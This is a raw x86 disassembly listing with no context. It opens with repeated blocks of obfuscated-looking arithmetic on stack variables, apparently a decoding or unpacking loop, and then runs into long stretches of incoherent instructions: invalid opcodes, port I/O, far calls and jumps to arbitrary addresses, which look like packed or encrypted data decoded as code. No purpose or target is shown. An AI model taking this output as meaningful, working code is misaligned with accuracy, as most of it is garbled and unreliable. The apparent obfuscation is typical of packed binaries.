  416c6b:	sbb    al,0xb0
  416c6d:	fisttp WORD PTR [eax-0x2405c277]
  416c73:	imul   ebp,DWORD PTR ds:0xa6ec1826,0x6a
  416c7a:	(bad)  
  416c7b:	jge    0x416c98
  416c7d:	sub    al,BYTE PTR [eax-0x3b]
  416c80:	jmp    0x416c8a
  416c82:	stos   BYTE PTR es:[edi],al
  416c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c84:	ins    DWORD PTR es:[edi],dx
  416c85:	pushf  
  416c86:	inc    esi
  416c87:	stos   BYTE PTR es:[edi],al
  416c88:	je     0x416c8f
  416c8a:	inc    edx
  416c8b:	cmp    eax,0x249ae809
  416c90:	mov    ebx,DWORD PTR [ebp-0x8]
  416c93:	xor    edx,eax
  416c95:	xor    ebx,eax
  416c97:	sub    edx,ebx
  416c99:	sub    edx,esi
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    BYTE PTR [ecx+0x7465ea78],al
  416df8:	inc    ebp
  416df9:	add    BYTE PTR [ebx-0x7c7ca1c2],0x40
  416e00:	push   edi
  416e01:	(bad)  
  416e03:	pop    edx
  416e04:	pop    esp
  416e05:	push   esi
  416e06:	mov    ebx,0x644b410c
  416e0b:	jg     0x416e7f
  416e0d:	leave  
  416e0e:	mov    esp,0xc37b7a5a
  416e13:	std    
  416e14:	cmp    esi,edx
  416e16:	lea    edx,[edx-0x397f3799]
  416e1c:	adc    al,0x89
  416e1e:	sar    BYTE PTR [esi+0x5f8570cc],0x16
  416e25:	adc    eax,0xe4c43645
  416e2a:	cwde   
  416e2b:	pop    esp
  416e2c:	adc    dh,dl
  416e2e:	push   cs
  416e2f:	scas   al,BYTE PTR es:[edi]
  416e30:	bound  ecx,QWORD PTR [esi]
  416e32:	and    DWORD PTR [edi+ebp*4+0x7cbba3fb],ebp
  416e39:	jae    0x416e07
  416e3b:	scas   al,BYTE PTR es:[edi]
  416e3c:	(bad)
  416e3f:	pop    edi
  416e40:	jmp    0x661b974
  416e45:	std    
  416e46:	sbb    DWORD PTR [ebp-0x42],0x1f249516
  416e4d:	je     0x416dd4
  416e4f:	arpl   WORD PTR [esi-0x3f],sp
  416e52:	jl     0x416eb5
  416e54:	pop    ss
  416e55:	jmp    0x513730d6
  416e5a:	hlt    
  416e5b:	jle    0x416e0f
  416e5d:	mov    edi,0xe743f13d
  416e62:	outs   dx,DWORD PTR ds:[esi]
  416e63:	outs   dx,DWORD PTR ds:[esi]
  416e64:	nop
  416e65:	aam    0xa3
  416e67:	and    al,0xab
  416e69:	xchg   edx,edx
  416e6b:	out    0x49,eax
  416e6d:	daa    
  416e6e:	jbe    0x416e33
  416e70:	inc    ebx
  416e71:	jp     0x416eb7
  416e73:	xor    dl,cl
  416e75:	jg     0x416e63
  416e77:	fs nop
  416e79:	jl     0x416e8f
  416e7b:	outs   dx,DWORD PTR ds:[esi]
  416e7c:	out    0xe0,eax
  416e7e:	jae    0x416e43
  416e80:	call   0x3326:0x6e2739bc
  416e87:	std    
  416e88:	push   ecx
  416e89:	std    
  416e8a:	stos   DWORD PTR es:[edi],eax
  416e8b:	jmp    0x416e5c
  416e8d:	in     al,0x47
  416e8f:	mov    cl,0xf2
  416e91:	add    dl,BYTE PTR [ebx]
  416e93:	jmp    0x1c984bdb
  416e98:	mov    al,0xc9
  416e9a:	ds adc eax,0x3d037c82
  416ea0:	mov    WORD PTR [ecx-0x3f886e28],gs
  416ea6:	jmp    0x416e3a
  416ea8:	test   eax,0x244e4a97
  416ead:	sub    al,0xc4
  416eaf:	add    dl,BYTE PTR [ebp-0x357edf10]
  416eb5:	mov    edx,0x89bfac5e
  416eba:	lea    esi,[edx]
  416ebc:	call   0x307a:0x9aebf717
  416ec3:	push   eax
  416ec4:	mov    DWORD PTR [esi+0x4dc091a4],eax
  416eca:	retf   0x8289
  416ecd:	sub    al,0x2d
  416ecf:	mov    esp,0x16d678ba
  416ed4:	ret    0x928b
  416ed7:	or     cl,ah
  416ed9:	add    BYTE PTR [ebx+0x39],ch
  416edc:	(bad)  
  416edd:	or     eax,0x31b5000b
  416ee2:	jg     0x416e69
  416ee4:	adc    dh,BYTE PTR [ebx]
  416ee6:	pop    esp
  416ee7:	inc    edi
  416ee8:	mov    eax,0x6e3d9752
  416eee:	je     0x416e9f
  416ef0:	mov    ebx,0x5fcf400f
  416ef6:	jbe    0x416ef3
  416ef8:	cwde   
  416ef9:	mov    ah,0x69
  416efb:	scas   al,BYTE PTR es:[edi]
  416efc:	js     0x416eb6
  416efe:	add    BYTE PTR [edx+0x1cdf70b1],dl
  416f04:	dec    ecx
  416f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f06:	iret   
  416f07:	dec    ecx
  416f08:	cmp    DWORD PTR [edi],edx
  416f0a:	ret    0xe4d0
  416f0d:	sbb    al,0xa2
  416f0f:	push   ds
  416f10:	js     0x416f6a
  416f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f13:	push   ebx
  416f14:	scas   eax,DWORD PTR es:[edi]
  416f15:	mov    eax,ds:0xa5a19868
  416f1a:	pop    ecx
  416f1b:	in     al,dx
  416f1c:	stc    
  416f1d:	icebp  
  416f1e:	sub    BYTE PTR ds:0x18b45a79,dl
  416f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f25:	add    eax,0xf9c95781
  416f2a:	add    DWORD PTR [edi-0x224865c1],ebx
  416f30:	and    dh,BYTE PTR [ebx-0x35]
  416f33:	jg     0x416efe
  416f35:	je     0x416fb2
  416f37:	lds    esi,FWORD PTR ds:0x985bcd45
  416f3d:	repz xchg ecx,eax
  416f3f:	imul   eax,DWORD PTR [esi-0x4f],0x78
  416f43:	inc    esp
  416f44:	or     DWORD PTR fs:[ebx+0x505bc23d],eax
  416f4b:	dec    esi
  416f4c:	out    0x4b,al
  416f4e:	jne    0x416f1e
  416f50:	or     al,0xfd
  416f52:	push   esp
  416f53:	fwait
  416f54:	sbb    al,0x2e
  416f56:	ja     0x416f5c
  416f58:	xchg   edx,eax
  416f59:	jno    0x416f15
  416f5b:	xlat   BYTE PTR ds:[ebx]
  416f5c:	js     0x416f56
  416f5e:	into   
  416f5f:	xor    BYTE PTR [ecx],dh
  416f61:	or     dl,ah
  416f63:	jns    0x416fd9
  416f65:	mov    al,0x82
  416f67:	test   DWORD PTR [ecx+0x520a5530],edi
  416f6d:	lock jbe 0x416f72
  416f70:	cmp    DWORD PTR [ecx-0x43],edx
  416f73:	fldcw  WORD PTR [ebx]
  416f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f76:	leave  
  416f77:	xor    BYTE PTR [ecx+0x7a2d166],0x81
  416f7e:	xor    eax,0xa9f9e25b
  416f83:	(bad)  
  416f84:	idiv   BYTE PTR [ecx+0x19d152dd]
  416f8a:	je     0x416f56
  416f8c:	mov    DWORD PTR [edx+eiz*2-0x59],ecx
  416f90:	das    
  416f91:	add    BYTE PTR [ecx],al
  416f93:	add    eax,0xa926adba
  416f98:	inc    ecx
  416f99:	xchg   edx,eax
  416f9a:	clc    
  416f9b:	cmp    al,BYTE PTR [ecx]
  416f9d:	jp     0x417019
  416f9f:	(bad)  
  416fa0:	and    bh,ch
  416fa2:	pushf  
  416fa3:	neg    DWORD PTR [eax+0x2b]
  416fa6:	ins    BYTE PTR es:[edi],dx
  416fa7:	sar    BYTE PTR [edx],1
  416fa9:	not    DWORD PTR ds:0x1a7cb864
  416faf:	and    BYTE PTR [edx-0x71],0xe1
  416fb3:	jg     0x416fe7
  416fb5:	dec    eax
  416fb6:	adc    eax,0xaa075e46
  416fbb:	aas    
  416fbc:	scas   eax,DWORD PTR es:[edi]
  416fbd:	and    BYTE PTR ds:0xf07457e8,0xde
  416fc4:	inc    ebx
  416fc5:	mov    dh,0xe8
  416fc7:	push   edi
  416fc8:	jns    0x417035
  416fca:	sbb    edx,DWORD PTR [edx+0x24]
  416fcd:	and    edi,ebp
  416fcf:	mov    ebx,0x8ee305a1
  416fd4:	and    dl,al
  416fd6:	repz not DWORD PTR [ebp+0x8a80886]
  416fdd:	cmp    dh,ah
  416fdf:	jp     0x41702b
  416fe1:	sti    
  416fe2:	dec    esi
  416fe3:	fdivr  st(7),st
  416fe5:	in     eax,0x1c
  416fe7:	jno    0x416f8a
  416fe9:	sbb    DWORD PTR [esi-0x42a5bdf0],esi
  416fef:	shl    BYTE PTR es:[edx-0x75d4a9f9],cl
  416ff6:	adc    al,0xce
  416ff8:	imul   edx,DWORD PTR [ecx-0x22],0xffffffa3
  416ffc:	cmc    
  416ffd:	call   0xfb15:0xca8b706a
  417004:	gs jno 0x416fc2
  417007:	bnd js 0x417032
  41700a:	aas    
  41700b:	pop    ds
  41700c:	adc    DWORD PTR [ebx+ebp*1],eax
  41700f:	adc    BYTE PTR [ebp+0x75038bae],0x7f
  417016:	jbe    0x416fdd
  417018:	inc    esi
  417019:	sar    dl,cl
  41701b:	xchg   esp,eax
  41701c:	loope  0x41706d
  41701e:	adc    DWORD PTR [edx-0x26],ecx
  417021:	lahf   
  417022:	stc    
  417023:	xchg   ebx,eax
  417024:	mov    BYTE PTR [edx+0x21],al
  417027:	mov    ebp,0x3f2b21fd
  41702c:	aas    
  41702d:	sub    ebx,edi
  41702f:	(bad)
  417032:	cld    
  417033:	and    bh,BYTE PTR [ebp+eiz*1+0x70f331e7]
  41703a:	retf   0x1dec
  41703d:	bound  esi,QWORD PTR [edi+eax*8]
  417040:	ja     0x41708d
  417042:	mov    ebp,DWORD PTR [eax]
  417044:	(bad)  
  417045:	cwde   
  417046:	rol    BYTE PTR [eax],cl
  417048:	lahf   
  417049:	outs   dx,DWORD PTR ds:[esi]
  41704a:	cmp    ebp,DWORD PTR [edi+eax*1-0x174ab1e7]
  417051:	push   edx
  417052:	mov    edx,DWORD PTR [ebp+ebx*2-0x6b297e6]
  417059:	mov    cl,0xea
  41705b:	aas    
  41705c:	pop    ecx
  41705d:	mov    eax,0xd5b52f1b
  417062:	(bad)  
  417063:	idiv   DWORD PTR [eax+ebp*1-0x20db15b0]
  41706a:	sub    DWORD PTR [eax-0x2f],ebp
  41706d:	popa   
  41706e:	(bad)  
  41706f:	retf   
  417070:	aad    0xc2
  417072:	scas   eax,DWORD PTR es:[edi]
  417073:	xchg   ebp,eax
  417074:	aaa    
  417075:	pop    ebx
  417076:	push   esp
  417077:	fsubr  QWORD PTR [edi-0x7cd3d18]
  41707d:	mov    DWORD PTR [edx-0x23],esp
  417080:	int    0xf5
  417082:	push   DWORD PTR [esi-0xa]
  417085:	add    eax,0x6102c8fe
  41708a:	mov    al,BYTE PTR [edx+0x4bfd263c]
  417090:	cmp    edx,ebx
  417092:	sbb    bl,BYTE PTR [ecx]
  417094:	push   ecx
  417095:	push   esp
  417096:	sahf   
  417097:	outs   dx,DWORD PTR ds:[esi]
  417098:	dec    esp
  417099:	jge    0x41702c
  41709b:	dec    esp
  41709c:	push   esi
  41709d:	adc    eax,0xfe123511
  4170a2:	rcr    cl,1
  4170a4:	push   ss
  4170a5:	push   edx
  4170a6:	sub    BYTE PTR [eax],al
  4170a8:	pop    eax
  4170a9:	jp     0x417040
  4170ab:	rcr    cl,cl
  4170ad:	pushf  
  4170ae:	cmp    esi,edx
  4170b0:	out    0x80,eax
  4170b2:	cld    
  4170b3:	clc    
  4170b4:	and    DWORD PTR [si+0x4ebe],ebp
  4170b9:	dec    eax
  4170ba:	push   ss
  4170bb:	pop    ebp
  4170bc:	mov    ecx,0x59f70024
  4170c1:	dec    edi
  4170c2:	aam    0x34
  4170c4:	push   esp
  4170c5:	push   eax
  4170c6:	lds    eax,FWORD PTR [ebp+edi*4+0xd]
  4170ca:	cmp    eax,0x1644aa04
  4170cf:	jae    0x4170cc
  4170d1:	das    
  4170d2:	push   cs
  4170d3:	hlt    
  4170d4:	pushf  
  4170d5:	jns    0x4170ef
  4170d7:	add    ebp,eax
  4170d9:	cdq    
  4170da:	js     0x4170b1
  4170dc:	retf   
  4170dd:	push   0xffffffca
  4170df:	xor    ebp,eax
  4170e1:	xor    al,BYTE PTR [edx-0x1e]
  4170e4:	jecxz  0x4170a9
  4170e6:	push   edx
  4170e7:	mov    edx,DWORD PTR [esp]
  4170ea:	dec    eax
  4170eb:	dec    ebp
  4170ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ed:	and    BYTE PTR [eax+edx*4],dh
  4170f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170f1:	out    dx,eax
  4170f2:	(bad)  
  4170f4:	mov    edi,es
  4170f6:	xchg   ebx,eax
  4170f7:	out    dx,eax
  4170f8:	push   0x91f78e27
  4170fd:	jnp    0x4170fc
  4170ff:	mov    bh,0xab
  417101:	call   0x831b:0x9627bf3f
  417108:	inc    edx
  417109:	imul   ebx,DWORD PTR [esi],0xf1bd73e
  41710f:	pop    ds
  417110:	pop    edx
  417111:	cmp    eax,0x40296924
  417116:	out    0xee,eax
  417118:	scas   eax,DWORD PTR es:[edi]
  417119:	cdq    
  41711a:	ins    DWORD PTR es:[edi],dx
  41711b:	inc    esp
  41711c:	scas   eax,DWORD PTR es:[edi]
  41711d:	mov    ah,0xb2
  41711f:	adc    al,0x68
  417121:	push   0x26
  417123:	ds adc ecx,ecx
  417126:	inc    esp
  417127:	xor    dh,BYTE PTR [ebp+0x34]
  41712a:	aam    0x12
  41712c:	adc    bl,BYTE PTR [eax+0x51]
  41712f:	loope  0x4170c8
  417131:	or     ah,BYTE PTR [edi]
  417133:	gs dec ebp
  417135:	fist   DWORD PTR [ecx]
  417137:	in     al,dx
  417138:	retf   0x6435
  41713b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41713c:	loope  0x4170e5
  41713e:	stc    
  41713f:	xchg   ebx,eax
  417140:	xor    BYTE PTR [ebx+0x64],0x42
  417144:	push   esi
  417145:	mov    eax,0xdf1a479b
  41714a:	xchg   edx,eax
  41714b:	popa   
  41714c:	out    dx,al
  41714d:	scas   al,BYTE PTR es:[edi]
  41714e:	test   eax,0xb1d6e85c
  417153:	push   edx
  417154:	retf   0xe8d6
  417157:	(bad)  [edi]
  417159:	repnz xchg ebp,eax
  41715b:	xor    DWORD PTR [esi+0x71dc5fe0],ebp
  417161:	dec    ebx
  417162:	adc    edi,DWORD PTR [edx+0x57]
  417165:	pop    esp
  417166:	daa    
  417167:	inc    esp
  417168:	jg     0x417108
  41716a:	push   ss
  41716b:	sbb    BYTE PTR [ebx],dl
  41716d:	retf   
  41716e:	fsub   QWORD PTR [edi-0x3d]
  417171:	and    DWORD PTR ds:0xd343b3ff,eax
  417177:	pop    ds
  417178:	pop    esp
  417179:	add    al,0xd2
  41717b:	lods   eax,DWORD PTR ds:[esi]
  41717c:	push   ebp
  41717d:	mov    eax,0x1b5ad8a3
  417182:	inc    edx
  417183:	std    
  417184:	adc    BYTE PTR [ecx+0x1c4a2b5d],cl
  41718a:	adc    ebp,DWORD PTR [eax+0x472a988d]
  417190:	popa   
  417191:	mov    edx,0x14c38c82
  417196:	adc    BYTE PTR [eax*8+0x64b360dc],0x71
  41719e:	clc    
  41719f:	push   ebx
  4171a0:	mov    dh,0xc2
  4171a2:	(bad)  
  4171a3:	or     eax,0x51353e0b
  4171a8:	les    eax,FWORD PTR [edi+0xa]
  4171ab:	fistp  WORD PTR [ecx]
  4171ad:	mov    ds:0x42541ab3,eax
  4171b2:	and    BYTE PTR [edi+0x7d264dc7],dl
  4171b8:	imul   ecx,DWORD PTR [esi],0x32
  4171bb:	outs   dx,DWORD PTR ds:[esi]
  4171bc:	stos   BYTE PTR es:[edi],al
  4171bd:	mov    esi,0xc3dbfe30
  4171c2:	pop    eax
  4171c3:	pusha  
  4171c4:	jmp    0x32e4:0xe3f9a2f7
  4171cb:	nop
  4171cc:	iret   
  4171cd:	rcr    edx,0xf1
  4171d0:	adc    eax,0x32eb7f20
  4171d5:	in     al,0xce
  4171d7:	fsub   DWORD PTR [edx]
  4171d9:	dec    edx
  4171da:	daa    
  4171db:	xchg   ebp,eax
  4171dc:	mov    eax,0x19ca14f1
  4171e1:	dec    edi
  4171e2:	pop    ss
  4171e3:	aam    0x36
  4171e5:	dec    esp
  4171e6:	mov    ah,0x15
  4171e8:	cdq    
  4171e9:	adc    DWORD PTR cs:[esi+0x55],ecx
  4171ed:	push   es
  4171ee:	xlat   BYTE PTR ds:[ebx]
  4171ef:	addr16 mov al,ds:0x14f0
  4171f3:	add    DWORD PTR ds:0x920b8545,0x6b
  4171fa:	sahf   
  4171fb:	adc    BYTE PTR [ebp+0x70a287d7],0x40
  417202:	sbb    BYTE PTR [ebp-0x40],bl
  417205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417206:	push   ds
  417207:	pop    esp
  417208:	cmp    al,0x3
  41720a:	ret    0x7cc
  41720d:	rcr    DWORD PTR [edi-0x34],0xc7
  417211:	stos   DWORD PTR es:[edi],eax
  417212:	ret    0x6510
  417215:	arpl   cx,cx
  417217:	ins    BYTE PTR es:[edi],dx
  417218:	and    eax,DWORD PTR [ecx]
  41721a:	and    BYTE PTR ds:0x3181575,0xbb
  417221:	ret    0xb60d
  417224:	push   ecx
  417225:	mov    ebx,0xaa62f96e
  41722a:	imul   ebx,DWORD PTR [edx],0xfffffff0
  41722d:	daa    
  41722e:	mov    edi,0x7b831a63
  417233:	xor    dh,BYTE PTR [ebx+0x1f]
  417236:	mov    ch,0xa3
  417238:	or     esi,edi
  41723a:	pop    eax
  41723b:	dec    esp
  41723c:	jno    0x4171dd
  41723e:	jg     0x4172a8
  417240:	xor    edi,DWORD PTR [ecx+0x1ec4ffce]
  417246:	cmp    ax,0x354
  41724a:	push   ds
  41724b:	or     BYTE PTR [edi+ebp*1+0x9ee9098],cl
  417252:	pop    ebp
  417253:	pusha  
  417254:	jnp    0x417219
  417256:	jns    0x417282
  417258:	mov    ebx,0x3dcfc704
  41725d:	cmp    eax,0xbda269bc
  417262:	inc    esp
  417263:	loop   0x4172d7
  417265:	test   DWORD PTR [edi],edx
  417267:	adc    bh,BYTE PTR [ebp-0x1a2716c2]
  41726d:	cld    
  41726e:	sbb    BYTE PTR [esi],cl
  417270:	bound  edi,QWORD PTR [esi-0x2ed9daa4]
  417276:	ins    BYTE PTR es:[edi],dx
  417277:	into   
  417278:	popa   
  417279:	jb     0x41729c
  41727b:	sbb    al,0xe6
  41727d:	mov    esi,DWORD PTR [esi-0x5fdee3f]
  417283:	out    dx,eax
  417284:	cmp    BYTE PTR [ecx+edi*8+0x1d0181ab],al
  41728b:	inc    edx
  41728c:	adc    BYTE PTR ds:0x8e64ab5,dh
  417292:	cmp    BYTE PTR [esi+0x24],dh
  417295:	mov    ds:0xf32f499b,eax
  41729a:	cvttps2pi mm5,QWORD PTR [ebx]
  41729d:	enter  0x8449,0xeb
  4172a1:	icebp  
  4172a2:	nop
  4172a3:	addr16 mov eax,0xc8145637
  4172a9:	dec    ebp
  4172aa:	stos   BYTE PTR es:[edi],al
  4172ab:	jb     0x4172c1
  4172ad:	sbb    al,0xbd
  4172af:	call   0x33692ca9
  4172b4:	sahf   
  4172b5:	pusha  
  4172b6:	sbb    al,0xe6
  4172b8:	dec    edx
  4172b9:	mov    gs,ebp
  4172bb:	sub    al,ah
  4172bd:	out    dx,al
  4172be:	leave  
  4172bf:	xchg   esp,eax
  4172c0:	into   
  4172c1:	jp     0x41725f
  4172c3:	pusha  
  4172c4:	xor    al,0x83
  4172c6:	cmp    eax,0x50ab0964
  4172cb:	xor    BYTE PTR [ebx-0x56],cl
  4172ce:	push   eax
  4172cf:	shl    DWORD PTR [edx],cl
  4172d1:	test   edx,ebp
  4172d3:	mov    eax,es:0x700bc2db
  4172d9:	hlt    
  4172da:	shr    BYTE PTR [edi+0x2a],cl
  4172dd:	outs   dx,BYTE PTR ds:[esi]
  4172de:	mov    eax,ds:0xc94b4423
  4172e3:	mov    esp,0xde5c315b
  4172e8:	test   BYTE PTR [ecx-0x7bda243b],ch
  4172ee:	inc    edx
  4172ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172f0:	dec    eax
  4172f1:	pop    esi
  4172f2:	addr16 cs push edx
  4172f5:	sub    esp,esi
  4172f7:	inc    ecx
  4172f8:	jo     0x417365
  4172fa:	out    dx,eax
  4172fb:	mov    esi,0xce30d8fe
  417300:	xor    bh,al
  417302:	rsqrtps xmm6,xmm4
  417305:	sti    
  417306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417307:	test   BYTE PTR [edi],al
  417309:	xor    esi,DWORD PTR [ebp+0x2cf2b718]
  41730f:	mov    al,0x1b
  417311:	repz shl DWORD PTR [ebx-0x55f96a4f],0x92
  417319:	out    0xa9,al
  41731b:	pop    edi
  41731d:	push   0x20
  41731f:	inc    ebx
  417320:	jge    0x4172f4
  417322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417323:	iret   
  417324:	push   edx
  417325:	xchg   DWORD PTR [eax-0x3f],eax
  417328:	ins    DWORD PTR es:[edi],dx
  417329:	xor    DWORD PTR [esi+0x27],ebx
  41732c:	dec    esp
  41732d:	frstor [edx+eiz*1+0x3936ae83]
  417334:	dec    edi
  417335:	jae    0x41737c
  417337:	mov    edx,0xad5661c9
  41733c:	jae    0x41731b
  41733e:	sub    al,0x2f
  417340:	mov    BYTE PTR [ecx+0x25],cl
  417343:	fistp  DWORD PTR [esi]
  417345:	jg     0x417322
  417347:	add    al,0x6b
  417349:	sbb    eax,0xef4379df
  41734e:	enter  0x25ec,0x9d
  417352:	lds    ecx,FWORD PTR [edx+0x6dbc6075]
  417358:	lods   eax,DWORD PTR ds:[esi]
  417359:	add    eax,0xf54ca3a0
  41735e:	pop    esi
  41735f:	or     DWORD PTR [esi+0x9c512b0],esp
  417365:	aad    0xa8
  417367:	cmp    edi,DWORD PTR [esi-0x65]
  41736a:	mov    cl,0xf0
  41736c:	push   esi
  41736d:	loope  0x41738f
  41736f:	push   ebx
  417370:	pusha  
  417371:	aam    0x7
  417373:	xor    al,0x36
  417375:	mov    bl,0x4c
  417377:	jecxz  0x417385
  417379:	rcl    DWORD PTR [esi+esi*8-0xd114e28],0xc0
  417381:	outs   dx,BYTE PTR ds:[esi]
  417382:	add    eax,0x4c1ff7cb
  417387:	adc    ebp,DWORD PTR [edx-0x414cde97]
  41738d:	pushaw 
  41738f:	std    
  417390:	xchg   ebx,eax
  417391:	xchg   esi,eax
  417392:	xchg   edi,eax
  417393:	pop    esp
  417394:	jb     0x417360
  417396:	jo     0x417349
  417398:	mov    ebp,0x9f1b4fb3
  41739d:	inc    edi
  41739e:	mov    eax,ds:0x5b94eb52
  4173a3:	xor    edi,DWORD PTR [edi+0x11d5661f]
  4173a9:	jecxz  0x417422
  4173ab:	inc    edx
  4173ac:	push   edx
  4173ad:	in     eax,dx
  4173ae:	adc    al,0x2
  4173b0:	clc    
  4173b1:	mov    esp,0x8b085ab8
  4173b6:	pop    ds
  4173b7:	shl    DWORD PTR [eax],cl
  4173b9:	jns    0x41742c
  4173bb:	cmp    BYTE PTR [edi],0xea
  4173be:	mov    al,0x29
  4173c0:	(bad)  
  4173c1:	adc    DWORD PTR [edx+0x14cd53a0],ebp
  4173c7:	ds jne 0x4173d7
  4173ca:	mov    eax,ds:0x81276358
  4173cf:	retw   
  4173d1:	test   eax,0x6d515cb3
  4173d6:	pop    eax
  4173d7:	(bad)  
  4173d8:	pop    ebp
  4173d9:	xchg   ebp,eax
  4173da:	inc    ecx
  4173db:	not    DWORD PTR [ebx+esi*1+0x6759b436]
  4173e2:	mov    eax,ds:0xd1fff4d
  4173e7:	jo     0x417370
  4173e9:	test   eax,0x8d0d2534
  4173ee:	ja     0x41737f
  4173f0:	rol    DWORD PTR [eax],cl
  4173f2:	adc    dh,BYTE PTR [edx-0xd]
  4173f5:	shl    DWORD PTR [ebx+0x36aafd8f],0x1d
  4173fc:	cs dec eax
  4173fe:	cmp    edi,DWORD PTR [ebp+0x6012e80e]
  417404:	xchg   edi,eax
  417405:	fwait
  417406:	retf   
  417407:	shl    DWORD PTR [edx],1
  417409:	call   0x920d51e0
  41740e:	loope  0x417411
  417410:	in     al,0xf2
  417412:	or     DWORD PTR [edi+0x58104b6d],esp
  417418:	mov    ebx,0x63d6dba9
  41741d:	retf   0x98af
  417420:	jne    0x41748f
  417422:	adc    cl,BYTE PTR [ebp+0x4f404137]
  417428:	hlt    
  417429:	mov    dl,BYTE PTR [ebx+0x1b]
  41742c:	xor    al,0xf7
  41742e:	cwde   
  41742f:	fbstp  TBYTE PTR ds:0xfb8c4599
  417435:	popa   
  417436:	pusha  
  417437:	pop    ebx
